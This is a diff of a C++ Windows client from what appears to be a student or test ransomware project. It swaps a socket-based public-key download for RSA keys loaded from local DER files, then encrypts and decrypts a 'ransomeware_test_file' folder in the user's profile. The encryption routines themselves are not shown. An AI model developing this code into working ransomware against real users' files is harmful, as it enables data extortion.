@@ -5,10 +5,9 @@
 #include <ws2tcpip.h>
 #include <iphlpapi.h> // IP Helper 라이브러리
 #include <iostream>
-#include <fstream>
-#include <time.h>
-#include <ctime>
-#include <openssl/ssl.h>
+#include <vector>
+#include <openssl/applink.c>
+#include <openssl/rsa.h>
 #include <openssl/pem.h>
 #include "framework.h"
 #include "client.h"
@@ -17,39 +16,70 @@
 using namespace std;
 
 #pragma comment(linker, "/entry:wWinMainCRTStartup /subsystem:console")
-#pragma comment(lib,"Ws2_32.lib")
 #pragma comment(lib, "IPHLPAPI.lib") // IP Helper 라이브러리
+#pragma comment(lib,"Ws2_32.lib")
 #pragma comment(lib, "libssl.lib")
 #pragma comment(lib, "libcrypto.lib")
 
+
 #define DEFAULT_PORT "8080"
-
-bool receiveAndSavePublicKey(SOCKET ConnectSocket);
-
 string userName;
+RSA* getPubKey();
+RSA* getPriKey();
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
 {
-
     string filename = "C:\\Users";
-    string downloadname, documentsname, desktopname, foldername;
 
     userName = getUserName();
     filename += "\\" + userName + "\\ransomeware_test_file";
     cout << "username: " << userName << endl;
     cout << endl;
 
+    RSA* pubKey = getPubKey();
+    EncryptDir(pubKey, filename);
+    RSA_free(pubKey);
 
-    // 암호화 키 생성 
-    unsigned char key[32] = { 0x00, }; //generateKey();
-
-    EncryptDir(key, filename);
-
-    DecryptDir(key, filename);
-
-
-  
+    RSA* priKey = getPriKey();
+    DecryptDir(priKey, filename);
+    RSA_free(priKey);
     return 0;
+}
+
+RSA* getPubKey() {
+    const char* publicKeyPath = "./public_key.der";
+
+    // 공개 키를 DER 형식으로 읽어옴
+    FILE* publicKeyFile = fopen(publicKeyPath, "rb");
+    if (!publicKeyFile) {
+        std::cerr << "Error opening public key file." << std::endl;
+    }
+
+    RSA* rsaPublicKey = d2i_RSAPublicKey_fp(publicKeyFile, NULL);
+    fclose(publicKeyFile);
+    if (!rsaPublicKey) {
+        std::cerr << "Error loading public key." << std::endl;
+    }
+   
+    return rsaPublicKey;
+}
+
+RSA* getPriKey() {
+    const char* privateKeyPath = "./private_key.der";
+
+    // 공개 키를 DER 형식으로 읽어옴
+    FILE* privateKeyFile = fopen(privateKeyPath, "rb");
+    if (!privateKeyFile) {
+        std::cerr << "Error opening private key file." << std::endl;
+    }
+
+    RSA* rsaPrivateKey = d2i_RSAPrivateKey_fp(privateKeyFile, NULL);
+    fclose(privateKeyFile);
+    if (!rsaPrivateKey) {
+        std::cerr << "Error loading private key." << std::endl;
+    }
+
+    return rsaPrivateKey;
 }
 
 
@@ -94,44 +124,3 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 //
 //    return macAddress;
 //}
-
-
-bool receiveAndSavePublicKey(SOCKET ConnectSocket) {
-    const int bufferSize = 4096; // 공개 키의 최대 길이로 조정
-    char recvBuffer[bufferSize];
-    int iResult = recv(ConnectSocket, recvBuffer, bufferSize, 0);
-    if (iResult <= 0) {
-        std::cerr << "Failed to receive public key from server" << std::endl;
-        return false;
-    }
-
-    // PEM 형식으로 공개 키 변환
-    std::string publicKeyStr(recvBuffer, iResult);
-    BIO* bio = BIO_new_mem_buf(publicKeyStr.c_str(), -1);
-    RSA* rsaKey = PEM_read_bio_RSA_PUBKEY(bio, nullptr, nullptr, nullptr);
-    if (rsaKey == nullptr) {
-        std::cerr << "Failed to convert public key to PEM format" << std::endl;
-        return false;
-    }
-
-    // PEM 파일로 저장
-    FILE* pemFile = fopen("public_key.pem", "wb");
-    if (pemFile == nullptr) {
-        std::cerr << "Failed to create PEM file" << std::endl;
-        RSA_free(rsaKey);
-        return false;
-    }
-    if (PEM_write_RSAPublicKey(pemFile, rsaKey) == 0) {
-        std::cerr << "Failed to write public key to PEM file" << std::endl;
-        RSA_free(rsaKey);
-        fclose(pemFile);
-        return false;
-    }
-
-    RSA_free(rsaKey);
-    fclose(pemFile);
-
-    std::cout << "Public key received and saved to public_key.pem" << std::endl;
-    return true;
-}
-
